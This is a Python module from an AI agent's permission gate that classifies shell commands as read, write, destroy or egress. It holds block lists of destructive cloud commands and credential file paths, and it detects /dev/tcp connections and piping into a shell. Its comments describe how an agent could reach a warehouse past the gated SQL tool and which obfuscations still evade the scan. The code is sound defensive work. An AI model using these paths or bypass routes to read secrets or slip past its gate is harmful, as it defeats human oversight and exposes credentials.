    # Cloud CLIs — destructive verbs sit at the SECOND positional (after the
    # service): `aws s3 rm`, `aws ec2 terminate-instances`, `gcloud … delete`.
    "aws": frozenset(
        {
            "rm",
            "rb",
            "delete",
            "delete-bucket",
            "delete-object",
            "terminate-instances",
            "delete-stack",
        }
    ),
    "gcloud": frozenset({"delete"}),
    "az": frozenset({"delete"}),
    "gsutil": frozenset({"rm"}),
    "rclone": frozenset({"delete", "purge", "deletefile", "rmdir"}),
    "oc": frozenset({"delete"}),
}
#: Cloud CLIs whose ``cp``/``sync``/``mv`` TO a remote URI is data egress.
_CLOUD_UPLOAD: frozenset[str] = frozenset({"aws", "gsutil", "gcloud", "az", "rclone"})
_SUBCOMMAND_READ: dict[str, frozenset[str]] = {
    "docker": frozenset({"ps", "images", "logs", "inspect", "version", "info", "stats", "top"}),
    "podman": frozenset({"ps", "images", "logs", "inspect", "version", "info"}),
    "kubectl": frozenset({"get", "describe", "logs", "explain", "top", "version", "api-resources"}),
    "helm": frozenset({"list", "status", "get", "show", "history", "version"}),
    "terraform": frozenset({"plan", "show", "validate", "output", "version", "fmt", "providers"}),
    "npm": frozenset({"ls", "list", "view", "outdated", "audit", "ping", "whoami", "search"}),
    "pnpm": frozenset({"ls", "list", "view", "outdated", "why", "audit"}),
    "yarn": frozenset({"list", "info", "why", "audit"}),
    "pip": frozenset({"show", "list", "freeze", "check", "config"}),
    "pip3": frozenset({"show", "list", "freeze", "check", "config"}),
    "cargo": frozenset({"tree", "search", "metadata", "version", "--version"}),
    "go": frozenset({"version", "env", "list", "vet", "doc"}),
    "brew": frozenset({"list", "info", "search", "outdated", "deps", "--version"}),
    # ``gh`` reads only in the two-level forms ``_classify_gh`` names.
    "aws": frozenset(),
    "systemctl": frozenset({"status", "show", "list-units", "is-active", "is-enabled", "cat"}),
}


#: A read subcommand whose arguments can turn it into a write: ``npm audit
#: fix`` installs packages (running their lifecycle scripts), ``pip config
#: set`` and ``go env -w`` write configuration, ``terraform fmt`` rewrites the
#: files it formats unless it only checks them, ``terraform providers lock``
#: writes the lock file.
_READ_SUB_WRITES: dict[tuple[str, str], str] = {
    ("npm", "audit"): "audit fix installs packages",
    ("pnpm", "audit"): "audit --fix rewrites the manifest",
    ("yarn", "audit"): "audit fix installs packages",
    ("pip", "config"): "pip config set/unset/edit writes configuration",
    ("pip3", "config"): "pip config set/unset/edit writes configuration",
    ("go", "env"): "go env -w/-u writes configuration",
    ("terraform", "fmt"): "terraform fmt rewrites the files it formats",
    ("terraform", "providers"): "terraform providers lock/mirror writes files",
}


def _read_sub_writes(sub: str, args: list[str]) -> bool:
    """Whether ``sub args`` is the writing form of a read subcommand."""
    rest = args[args.index(sub) + 1 :] if sub in args else []
    if sub == "audit":
        return "fix" in rest or "--fix" in rest
    if sub == "config":
        operands = [a for a in rest if not a.startswith("-")]
        return bool(operands) and operands[0] not in ("list", "get", "debug")
    if sub == "env":
        return any(a in ("-w", "-u") for a in rest)
    if sub == "fmt":
        return not any(a in ("-check", "--check") for a in rest)
    if sub == "providers":
        return any(not a.startswith("-") for a in rest)
    return False


def _classify_subcommand(name: str, args: list[str]) -> StatementInfo:
    positionals = [a for a in args if not a.startswith("-")]
    sub = positionals[0] if positionals else ""
    # Scan the leading positionals so a TWO-level destructive verb is caught
    # (`docker volume rm`, `aws s3 rm`, `aws ec2 terminate-instances`).
    destroy_verbs = _SUBCOMMAND_DESTROY.get(name, frozenset())
    hit = next((p for p in positionals[:3] if p in destroy_verbs), None)
    if hit is not None:
        return _write(Effect.DESTROY, f"{name}_{hit}", f"{name} {hit} is destructive")
    # Cloud upload to a remote URI is egress (data leaving): `aws s3 cp ./x s3://…`
    # — the DEST (last positional) being remote distinguishes upload from download.
    if name in _CLOUD_UPLOAD and any(p in ("cp", "sync", "mv", "rsync") for p in positionals[:3]):
        dest = positionals[-1] if positionals else ""
        if "://" in dest:
            return _write(Effect.EGRESS, f"{name}_upload", f"{name} uploads data to {dest[:40]}")
    if sub in _SUBCOMMAND_READ.get(name, frozenset()):
        refuted = _READ_SUB_WRITES.get((name, sub))
        if refuted is not None and _read_sub_writes(sub, args):
            return _write(Effect.WRITE, f"{name}_{sub}", refuted)
        return _write(Effect.READ, f"{name}_{sub}")
    return _write(Effect.WRITE, f"{name}_{sub or 'cmd'}", heuristic=not sub)


#: ``gh`` group -> the verbs under it that only read. Everything else under a
#: group creates, edits, merges, closes, cancels or downloads.
_GH_READ: dict[str, frozenset[str]] = {
    "pr": frozenset({"view", "list", "status", "diff", "checks"}),
    "issue": frozenset({"view", "list", "status"}),
    "repo": frozenset({"view", "list"}),
    "run": frozenset({"view", "list", "watch"}),
    "workflow": frozenset({"view", "list"}),
    "release": frozenset({"view", "list"}),
    "auth": frozenset({"status"}),
    "search": frozenset({"repos", "issues", "prs", "code", "commits"}),
    "secret": frozenset({"list"}),
    "variable": frozenset({"list", "get"}),
    "label": frozenset({"list"}),
    "gist": frozenset({"list", "view"}),
    "cache": frozenset({"list"}),
}
#: ``gh`` group -> verbs that delete something on GitHub that cannot be undone.
_GH_DESTROY: dict[str, frozenset[str]] = {
    "repo": frozenset({"delete", "archive"}),
    "release": frozenset({"delete", "delete-asset"}),
    "issue": frozenset({"delete"}),
    "run": frozenset({"delete"}),
    "cache": frozenset({"delete"}),
    "secret": frozenset({"delete"}),
    "variable": frozenset({"delete"}),
    "label": frozenset({"delete"}),
    "gist": frozenset({"delete"}),
    "ssh-key": frozenset({"delete"}),
    "gpg-key": frozenset({"delete"}),
}
#: ``gh api`` options that send a body, which makes the request a POST.
_GH_API_BODY_OPTIONS: tuple[str, ...] = ("-f", "-F", "--field", "--raw-field", "--input")


def _gh_api_method(args: list[str]) -> str:
    """The HTTP method a ``gh api`` call sends: the ``-X``/``--method`` value,
    else POST when a field or an input body is given, else GET."""
    for i, a in enumerate(args):
        if a in ("-X", "--method") and i + 1 < len(args):
            return args[i + 1].upper()
        if a.startswith("--method="):
            return a.split("=", 1)[1].upper()
        if a.startswith("-X") and len(a) > 2:
            return a[2:].upper()
    if any(a.startswith(_GH_API_BODY_OPTIONS) for a in args):
        return "POST"
    return "GET"


def _classify_gh(args: list[str]) -> StatementInfo:
    positionals = [a for a in args if not a.startswith("-")]
    group = positionals[0] if positionals else ""
    verb = positionals[1] if len(positionals) > 1 else ""
    if group == "api":
        method = _gh_api_method(args)
        if method == "GET":
            return _write(Effect.READ, "gh_api")
        if method == "DELETE":
            return _write(Effect.DESTROY, "gh_api_delete", "gh api -X DELETE deletes on GitHub")
        return _write(Effect.WRITE, "gh_api_write", f"gh api sends a {method}")
    if group == "status":
        return _write(Effect.READ, "gh_status")
    if verb in _GH_DESTROY.get(group, frozenset()):
        return _write(Effect.DESTROY, f"gh_{group}_{verb}", f"gh {group} {verb} is destructive")
    if group == "auth" and any(a in ("-t", "--show-token") for a in args):
        return _write(Effect.WRITE, "gh_auth_token", "gh auth status --show-token prints a token")
    if verb in _GH_READ.get(group, frozenset()):
        return _write(Effect.READ, f"gh_{group}_{verb}")
    return _write(Effect.WRITE, f"gh_{group or 'cmd'}_{verb or 'cmd'}", heuristic=not verb)


def _classify_leaf(inv: Invocation) -> tuple[StatementInfo, Confidence]:
    """Classify a single resolved command. An observer that writes a file
    through an option or an operand (``sort -o F``, ``uniq IN OUT``, ``yq -i``,
    ``less -o F``) is the write it is: the model names the file, this names
    the effect."""
    statement, confidence = _leaf_verdict(inv)
    if _SEVERITY[statement.effect] < _SEVERITY[Effect.WRITE]:
        runs = _observer_runs_a_program(inv)
        if runs is not None:
            return _write(Effect.WRITE, f"{inv.program}_runs", runs, heuristic=True), "unknown"
    if _SEVERITY[statement.effect] < _SEVERITY[Effect.WRITE] and (inv.writes or inv.unnamed_write):
        if inv.program in ("yq", "jq"):
            return _write(
                Effect.WRITE, f"{inv.program}_inplace", f"{inv.program} -i edits files in place"
            ), confidence
        return _write(
            Effect.WRITE,
            f"{inv.program}_output",
            f"{inv.program} writes a file it names by an option or an operand",
        ), confidence
    return statement, confidence


#: Variables an assignment prefix may set without changing what a program
#: runs. Any other (``LD_PRELOAD``, ``PAGER``, ``GIT_SSH_COMMAND``, ``BASH_ENV``,
#: ``LESSOPEN``, ``PATH``) can make an observer load or run code the command
#: does not show, so it takes the read out of the auto-allowed tier.
_INERT_ENVIRONMENT: frozenset[str] = frozenset(
    {
        "LANG",
        "LANGUAGE",
        "TZ",
        "TERM",
        "NO_COLOR",
        "FORCE_COLOR",
        "CLICOLOR",
        "CLICOLOR_FORCE",
        "COLUMNS",
        "LINES",
        "GREP_COLOR",
        "GREP_COLORS",
        "LS_COLORS",
    }
)

#: Options through which a program in the read corpus runs another program:
#: ``rg --pre CMD``, ``man -P CMD`` / ``--html=BROWSER``, ``xmllint --shell``
#: (which reads ``save``/``write`` commands from stdin).
_RUNS_OPTIONS: dict[str, tuple[str, ...]] = {
    "rg": ("--pre",),
    "man": ("-P", "--pager", "-H", "--html", "--browser"),
    "xmllint": ("--shell",),
}

#: A sed ``e`` command (at the start of the script, or after an address, a
#: ``!``, ``;``, ``{`` or a newline), or the ``e`` flag of a substitution:
#: GNU sed runs the text as a shell command.
_SED_ADDRESS = r"(?:\d+|\$|/(?:\\.|[^/])*/)"
_SED_EXEC_COMMAND = re.compile(
    rf"(?:^|[;{{\n}}])\s*(?:{_SED_ADDRESS}(?:\s*,\s*{_SED_ADDRESS})?)?\s*!?\s*e(?:\s|;|$)"
)
_SED_EXEC_FLAG = re.compile(
    r"s(?P<d>[^\\\n\s])(?:\\.|(?!(?P=d)).)*(?P=d)(?:\\.|(?!(?P=d)).)*(?P=d)[gpIiMmw0-9]*e"
)

#: git options that set configuration for the run (``core.fsmonitor``,
#: ``core.sshCommand``, ``diff.external``, ``core.pager`` all name a program).
_GIT_CONFIG_OVERRIDES: tuple[str, ...] = ("-c", "--config-env")


def _git_runs_a_program(args: list[str]) -> str | None:
    sub, rest = _git_subcommand(args)
    head = args[: len(args) - len(rest)]
    for a in head:
        if a in _GIT_CONFIG_OVERRIDES or (a.startswith(("--config-env=", "-c")) and a != "-C"):
            return "git -c sets configuration that can name a program to run"
        if a.startswith("--exec-path="):
            return "git --exec-path runs git commands from another directory"
    if sub == "grep" and any(a.startswith(("-O", "--open-files-in-pager")) for a in rest):
        return "git grep -O opens the matches in a program it runs"
    if sub in ("fetch", "pull", "ls-remote", "clone") and any(
        a.startswith("--upload-pack") or (sub == "clone" and a.startswith("-u")) for a in rest
    ):
        return f"git {sub} --upload-pack runs a program"
    return None


def _observer_runs_a_program(inv: Invocation) -> str | None:
    """Why a command the corpus reads as an observer runs code it does not
    show, or ``None``."""
    loaded = [
        name
        for name in inv.environment
        if name not in _INERT_ENVIRONMENT and not name.startswith("LC_")
    ]
    if loaded:
        return f"{loaded[0]} set for the command can change what it runs"
    args = list(inv.argv)
    if inv.program == "git":
        return _git_runs_a_program(args)
    if inv.program in ("sed", "gsed") and any(
        _SED_EXEC_COMMAND.search(script) or _SED_EXEC_FLAG.search(script)
        for script in _sed_scripts(args)
    ):
        return "a sed e command runs a shell command"
    options = _RUNS_OPTIONS.get(inv.program)
    if options and any(a.split("=", 1)[0] in options for a in args):
        return f"{inv.program} runs another program through an option"
    return None


def _leaf_verdict(inv: Invocation) -> tuple[StatementInfo, Confidence]:
    name, args = inv.program, list(inv.argv)
    if inv.role == "interpreter":
        return _write(Effect.WRITE, name, f"{name} runs arbitrary code", heuristic=True), "unknown"

    if not name:
        return _write(Effect.WRITE, "dynamic", "command name is a variable/substitution"), "unknown"

    if name == "git":
        return _classify_git(args), "exact"
    if name == "gh":
        return _classify_gh(args), "exact"
    if name in ("curl", "wget"):
        return _classify_curl_wget(inv), "exact"
    if name in _NETWORK_REACH:
        return _classify_network_reach(inv, name, _NETWORK_REACH_REASON), "exact"
    if name == "find":
        return _classify_find(args), "exact"
    if name in ("sed", "gsed"):
        return _classify_sed(args), "exact"
    if name == "ip":
        return _classify_ip(args), "exact"
    if name == "ifconfig":
        return _classify_ifconfig(args), "exact"
    if name == "rsync":
        # remote spec (host:path) → egress; local→local → write.
        if any(":" in a and not a.startswith("-") and "://" not in a.split(":")[0] for a in args):
            return _write(Effect.EGRESS, "rsync_remote", "rsync to a remote host"), "exact"
        return _write(Effect.WRITE, "rsync"), "exact"
    if name in _SUBCOMMAND_READ or name in _SUBCOMMAND_DESTROY:
        return _classify_subcommand(name, args), "exact"

    if name in _DESTROY:
        return _write(Effect.DESTROY, name, f"{name} is destructive"), "exact"
    if name in _EGRESS:
        return _write(Effect.EGRESS, name, f"{name} moves data off the machine"), "exact"
    if name in _WRITE:
        return _write(Effect.WRITE, name), "exact"
    if name in _READ:
        return _write(Effect.READ, name), "exact"

    # Not in the known read/write sets → new to the permission ruleset; assume
    # write (heuristic). The reason frames it as new-to-permissions, not invalid.
    return _write(Effect.WRITE, name or "unknown", f'New command "{name}"', heuristic=True), (
        "heuristic"
    )


def _redirected_into_a_file(inv: Invocation) -> bool:
    """Whether a redirect in force on ``inv`` persistently writes a regular file.

    A write redirect to a real path is a write; the same redirect to a
    bit-bucket device (``/dev/null`` & friends) is not, since discarding output
    is still a read. A destination the shell computes, or one assembled from
    pieces, cannot be proved a sink and is treated as a write.
    """
    return any(
        redirect.writing
        and (redirect.target is None or not redirect.plain or redirect.target not in _NULL_SINKS)
        for redirect in inv.redirects
    )


def _classify_effects(
    command: str, effects: ShellEffects
) -> tuple[list[StatementInfo], Confidence]:
    """Classify every invocation the model read → (statements, confidence)."""
    statements: list[StatementInfo] = []
    confidence: Confidence = "exact"
    for inv in effects.invocations:
        classified, conf = _classify_invocation(inv)
        if inv.via_shell:
            classified = [
                statement.model_copy(update={"heuristic": True}) for statement in classified
            ]
        if _redirected_into_a_file(inv):
            classified = [
                _write(
                    Effect.WRITE,
                    info.operation or "redirect",
                    "output redirected to a file",
                )
                if _SEVERITY[info.effect] < _SEVERITY[Effect.WRITE]
                else info
                for info in classified
            ]
        statements.extend(classified)
        if conf == "unknown":
            confidence = "unknown"
        elif conf == "heuristic" and confidence == "exact":
            confidence = "heuristic"

    if any(location.text.startswith(_NETWORK_DEVICES) for location in effects.locations):
        statements.append(
            _write(Effect.EGRESS, "dev_tcp", "bash opens a network connection through /dev/tcp")
        )

    if _pipe_to_shell(effects):
        statements.append(
            _write(Effect.WRITE, "pipe_to_shell", "piping into a shell interpreter", heuristic=True)
        )
        confidence = "unknown"

    if not statements:
        if command.strip():
            return [
                _write(Effect.WRITE, "unknown", "unparseable command", heuristic=True)
            ], "unknown"
        return [_write(Effect.READ, "empty")], "exact"
    if effects.parse_error and confidence == "exact":
        confidence = "heuristic"
    return statements, confidence


def _compound(effects: ShellEffects) -> bool:
    """Whether the command is more than one plain invocation: two statements, a
    pipe, a list, a loop, a subshell, a substitution, or output redirected into
    a file. Unparseable text counts as compound, the narrower scope being the
    safe side."""
    return (
        effects.parse_error
        or effects.statements > 1
        or effects.compound_structure
        or any(_redirected_into_a_file(inv) for inv in effects.invocations)
    )


def _pipe_to_shell(effects: ShellEffects) -> bool:
    """True if a pipeline feeds a bare shell/code interpreter (``… | sh``) — an
    arbitrary-execution sink we can't analyze."""
    return any(
        inv.piped and inv.program in SHELLS | CODE_INTERPRETERS and "-c" not in inv.argv
        for inv in effects.invocations
    )


def classify_command(command: str) -> ActionDescriptor:
    """Classify a shell command string into an ``ActionDescriptor`` (capability
    ``shell``). Effect = MAX over every command anywhere in the parse tree.
    A non-read command that names a warehouse database file, or interpreter
    code pairing a warehouse driver with write-shaped SQL, is raised to the
    DESTROY floor (see :func:`_warehouse_floor_reason`)."""
    effects = analyze_shell(command, home_as_text=True)
    statements, confidence = _classify_effects(command, effects)
    effect = Effect.READ
    operation = statements[0].operation if statements else ""
    reasons: list[str] = []
    targets: list[ResourceRef] = []
    for st in statements:
        if _SEVERITY[st.effect] > _SEVERITY[effect]:
            operation = st.operation
        effect = _max(effect, st.effect)
        reasons.extend(st.reasons)
        _extend_unique_targets(targets, st.targets)
    if effect not in (Effect.DESTROY, Effect.EGRESS, Effect.EXEC) and not (
        effect == Effect.READ and confidence == "exact"
    ):
        # Tighten-only, the warehouse sibling of the sensitive-path floor: an
        # opaque or writing route to the warehouse binds the human floor in
        # every mode but bypass, so the auto-mode judge never waves through what
        # the SQL gate exists to weigh. An exact READ stays a read.
        floor = _warehouse_floor_reason(command, statements)
        if floor is not None:
            effect = Effect.DESTROY
            reasons.append(floor)
    return ActionDescriptor(
        capability="shell",
        effect=effect,
        operation=operation,
        targets=targets,
        raw=command,
        statements=statements,
        reasons=reasons,
        classifier="tree-sitter-bash",
        confidence=confidence,
        scope="command" if _compound(effects) else "operation",
    )


#: Path fragments whose appearance in a command escalates it to an EGRESS-level
#: gate — so even an auto-allowed READ (``cat`` / ``grep`` are in the read corpus)
#: of a secret like ``~/.alkera/auth.yml`` must be APPROVED in ``default``, JUDGED in
#: ``auto``, and REFUSED in ``read_only`` — while ``bypass`` still waives it. A
#: deliberately BROAD substring match: over-prompting on a false positive is safe;
#: silently exfiltrating a secret is not.
_SENSITIVE_PATH_MARKERS: tuple[str, ...] = (
    ".alkera",  # the 90-day gateway JWT (auth.yml) + alkera config
    ".ssh",  # private keys, known_hosts
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "id_dsa",
    ".aws",  # AWS credentials / config
    ".azure",  # Azure CLI tokens
    ".config/gcloud",  # gcloud credentials (direct file reads)
    "gcloud auth",  # `gcloud auth print-access-token`/`list` prints live OAuth creds;
    # narrower than a bare "gcloud" so harmless reads (config/projects list) aren't escalated
    ".oci",  # Oracle Cloud
    ".config/gh",  # GitHub CLI token
    ".git-credentials",
    ".config/git/credentials",
    ".netrc",
    ".npmrc",
    ".env",  # project secrets (DB pw / API keys / SMTP) — also .env.local/.env.production
    ".pypirc",
    ".gem/credentials",
    ".cargo/credentials",
    ".m2/settings.xml",  # Maven server creds
    ".gnupg",
    ".kube",  # kubeconfig
    ".docker/config",
    ".vault-token",
    ".databrickscfg",
    ".terraform.d",
    ".config/rclone",
    ".chef",
    "/var/run/secrets",  # k8s service-account tokens
    ".pem",  # private-key / certificate files anywhere
    ".key",
)


def _strip_shell_quoting(command: str) -> str:
    """Drop shell quote + escape characters so a quote-split path re-collapses —
    ``~/.s''sh`` → ``~/.ssh``, ``."ssh"`` → ``.ssh``, ``.s\\sh`` → ``.ssh`` — closing
    the trivial evasions of the substring scan below. (A determined ``$VAR`` / ``$(…)``
    obfuscation can still slip; resolving each argument off the parse tree is the
    complete fix and a sensible follow-up.)"""
    return command.translate(str.maketrans("", "", "'\"`\\"))


#: The one switch for the credential-path gate — the escalation that raises an
#: action naming a secret-looking path (``~/.ssh``, ``~/.alkera/auth.yml``, a
#: ``.env``, a ``*.pem``) to EGRESS on every lane: the parent-hosted shell
#: (:func:`gate_shell_action`), the opencode translator and the Claude adapter.
#:
#: OFF by default. The heuristic is a broad substring scan that has not been
#: tested thoroughly against the paths a real session names: on a cloud box
#: opencode's worktree is ``/`` (a chat folder is not a git checkout), so it
#: reports the chat's own ``plan.md`` as ``opt/alkera-work/.alkera/chats/…``,
#: which the scan matched on ``.alkera`` and, resolved against the wrong root,
#: missed the sandbox carve-out — and plan mode refused the plan file its own
#: steering had asked for. Until the gate is exercised end to end it stays
#: off; the code is kept in place so it can come back deliberately by setting
#: the variable to ``1``. With it off, a path decides nothing on its own: the
#: permission mode, the rule table and the write fence decide, as they do for
#: any other read or write.
CREDENTIAL_PATH_GATE_ENV = "ALKERA_CREDENTIAL_PATH_GATE"

_TRUE_WORDS: frozenset[str] = frozenset({"1", "true", "yes", "on"})


def credential_path_gate_enabled() -> bool:
    """Whether the credential-path escalation is on — read from
    :data:`CREDENTIAL_PATH_GATE_ENV` at call time, so a test or an operator can
    turn it on without a restart of the module. Anything but a true word is off."""
    return os.environ.get(CREDENTIAL_PATH_GATE_ENV, "").strip().lower() in _TRUE_WORDS


def raise_effect(
    descriptor: ActionDescriptor, floor: Effect, *, reason: str | None = None
) -> ActionDescriptor:
    """``descriptor`` with its effect raised to at least ``floor``: the higher of
    the two in the tier order, never lower. An escalation that SETS a tier instead
    would pull an EXEC (above ``floor``) down to it. ``reason`` is recorded only
    when the tier actually rises. An effect outside the tier order (the agent's
    memory) ranks with a read, so it is raised."""
    if _SEVERITY.get(descriptor.effect, 0) >= _SEVERITY[floor]:
        return descriptor
    reasons = [*descriptor.reasons, reason] if reason else descriptor.reasons
    return descriptor.model_copy(update={"effect": floor, "reasons": reasons})


def command_touches_sensitive_path(command: str) -> bool:
    """Whether a shell command references a path that typically holds a secret
    (credentials, private keys, tokens). A broad, case-insensitive substring scan
    over the de-quoted command — the gate it feeds (:func:`gate_shell_action`)
    escalates such a command so it can't be silently auto-allowed as a plain read."""
    lowered = _strip_shell_quoting(command).lower()
    if any(marker in lowered for marker in _SENSITIVE_PATH_MARKERS):
        return True
    # The gateway JWT lives at ALKERA_HOME/auth.yml — match the RESOLVED home so a
    # non-default ALKERA_HOME (a custom install / a test override) is caught too, not
    # only the literal ``.alkera``. Read it at call time (honors a monkeypatch); a
    # lazy import keeps this leaf module decoupled from the CLI paths layer.
    try:
        from alkera_cli.host import paths

        return str(paths.ALKERA_HOME).lower() in lowered
    except Exception:  # pragma: no cover - paths import never fails in practice
        return False


#: A ``*.duckdb`` file IS a local warehouse (the duckdb_local plugin registers one
#: gated SQL connection per file), so a shell route to one (an opaque interpreter,
#: a bare DB-CLI session, a redirect) is warehouse access the SQL gate never
#: measured. An agent reaching the warehouse through ``python3`` plus the duckdb
#: library would otherwise pass the auto-mode judge as a generic write.
_WAREHOUSE_FILE_MARKER = ".duckdb"

_WAREHOUSE_BYPASS_REASON = (
    "reaches a DuckDB warehouse file outside the gated sql.query tool. Route "
    "warehouse work through sql.query, where a refusal names what breaks and a "
    "declared intent lets wanted breakage proceed"
)


def command_touches_warehouse_file(command: str) -> bool:
    """Whether a shell command names a local DuckDB warehouse file. The same
    de-quoted substring scan as :func:`command_touches_sensitive_path`, and
    broad for the same reason. Over-prompting on a scratch ``.duckdb`` file is
    safe, an ungated warehouse write is not."""
    return _WAREHOUSE_FILE_MARKER in _strip_shell_quoting(command).lower()


#: Driver modules whose import reaches a warehouse with no file path on the
#: command line. Matched de-quoted, so a quote-split spelling re-collapses; the
#: import must spell the module name to run, which a file path never had to.
_WAREHOUSE_DRIVER_MARKERS: tuple[str, ...] = ("duckdb", "psycopg", "snowflake")

#: Statement shapes that change warehouse state, on word boundaries so prose
#: like "dropdown" cannot fire the floor. The privilege words come from the
#: policy floor's own operation list, so the two vocabularies cannot drift.
_WAREHOUSE_WRITE_WORDS: frozenset[str] = frozenset(
    {"insert", "update", "delete", "drop", "create", "alter", "truncate", "merge", "copy", "attach"}
) | {op.split("_", 1)[0] for op in _FLOOR_OPERATIONS}
_WAREHOUSE_WRITE_SQL = re.compile(r"\b(?:" + "|".join(sorted(_WAREHOUSE_WRITE_WORDS)) + r")\b")

_WAREHOUSE_DRIVER_REASON = (
    "runs interpreter code naming a warehouse driver beside write-shaped SQL, "
    "outside the gated sql.query tool. Route warehouse work through sql.query, "
    "where a refusal names what breaks and a declared intent lets wanted "
    "breakage proceed"
)

#: Operations whose statement runs code the parse cannot see into.
_OPAQUE_EXEC_OPERATIONS: frozenset[str] = (
    CODE_INTERPRETERS | SHELLS | frozenset({"pipe_to_shell", "dynamic", "eval"})
)


#: A driver ``.connect(`` call with its first argument -- the CONNECTION target,
#: the one string that names a warehouse. Call text (``.sql(``/``.execute(``
#: arguments) never counts: module-level ``duckdb.sql(...)`` runs in-memory, and
#: ``:memory:`` is scratch, not a warehouse. Prose mentioning a driver makes no
#: call at all.
_WAREHOUSE_CONNECT_CALL = re.compile(
    r"\b(?:" + "|".join(_WAREHOUSE_DRIVER_MARKERS) + r")\w*(?:\.\w+)*"
    r"\.connect\(\s*([^(),]*)"
)

#: The alias-binding forms an interpreter one-liner hides the driver behind:
#: ``import <driver> as <name>`` and ``from <driver> import connect [as <name>]``.
_WAREHOUSE_IMPORT_ALIAS = re.compile(
    r"\bimport\s+(?:" + "|".join(_WAREHOUSE_DRIVER_MARKERS) + r")\w*(?:\.\w+)*\s+as\s+(\w+)"
)
_WAREHOUSE_CONNECT_IMPORT = re.compile(
    r"\bfrom\s+(?:" + "|".join(_WAREHOUSE_DRIVER_MARKERS) + r")\w*(?:\.\w+)*"
    r"\s+import\s+connect(?:\s+as\s+(\w+))?"
)


def _connect_targets(lowered: str) -> list[str]:
    """Every connect-call first argument in the command, aliased or not. A
    module alias reaches ``.connect(`` under its bound name and an imported
    ``connect`` is called bare, so both fold into the same scan."""
    raw = [m.group(1) for m in _WAREHOUSE_CONNECT_CALL.finditer(lowered)]
    for alias in {m.group(1) for m in _WAREHOUSE_IMPORT_ALIAS.finditer(lowered)}:
        raw += re.findall(r"\b" + re.escape(alias) + r"(?:\.\w+)*\.connect\(\s*([^(),]*)", lowered)
    for alias in {m.group(1) or "connect" for m in _WAREHOUSE_CONNECT_IMPORT.finditer(lowered)}:
        raw += re.findall(r"\b" + re.escape(alias) + r"\(\s*([^(),]*)", lowered)
    return [_connect_target(value) for value in raw]


def _drives_warehouse_sql(command: str, statements: list[StatementInfo]) -> bool:
    """Whether an interpreter run hands a warehouse driver write-shaped SQL.

    The ``.duckdb`` floor keys on a file path, which a split literal or an env
    var hides. The driver import cannot be split and still run, so this scan
    holds where the path scan is blind. It fires only beside a statement the
    parse already calls opaque code, and only when the driver connects to a
    real target (:func:`_connect_targets`) -- so a sentence naming a driver,
    and a connection-less or in-memory session, never floor. The module
    docstring names what still slips."""
    if not any(st.operation in _OPAQUE_EXEC_OPERATIONS for st in statements):
        return False
    lowered = _strip_shell_quoting(command).lower()
    if not any(t and t != ":memory:" for t in _connect_targets(lowered)):
        return False
    return _WAREHOUSE_WRITE_SQL.search(lowered) is not None


def _connect_target(raw: str) -> str:
    """The captured connect argument as a comparable value: a ``name=`` keyword
    prefix and residual quoting drop, so ``database=':memory:'`` reads as
    ``:memory:``."""
    value = raw.strip()
    head, sep, tail = value.partition("=")
    if sep and head.strip().isidentifier():
        value = tail.strip()
    return value.strip("'\"")


def _warehouse_floor_reason(command: str, statements: list[StatementInfo]) -> str | None:
    """The floor reason when a command reaches a warehouse outside ``sql.query``,
    else ``None``."""
    if command_touches_warehouse_file(command):
        return _WAREHOUSE_BYPASS_REASON
    if _drives_warehouse_sql(command, statements):
        return _WAREHOUSE_DRIVER_REASON
    return None


__all__ = [
    "CREDENTIAL_PATH_GATE_ENV",
    "classify_command",
    "command_touches_sensitive_path",
    "command_touches_warehouse_file",
    "credential_path_gate_enabled",
    "raise_effect",
]
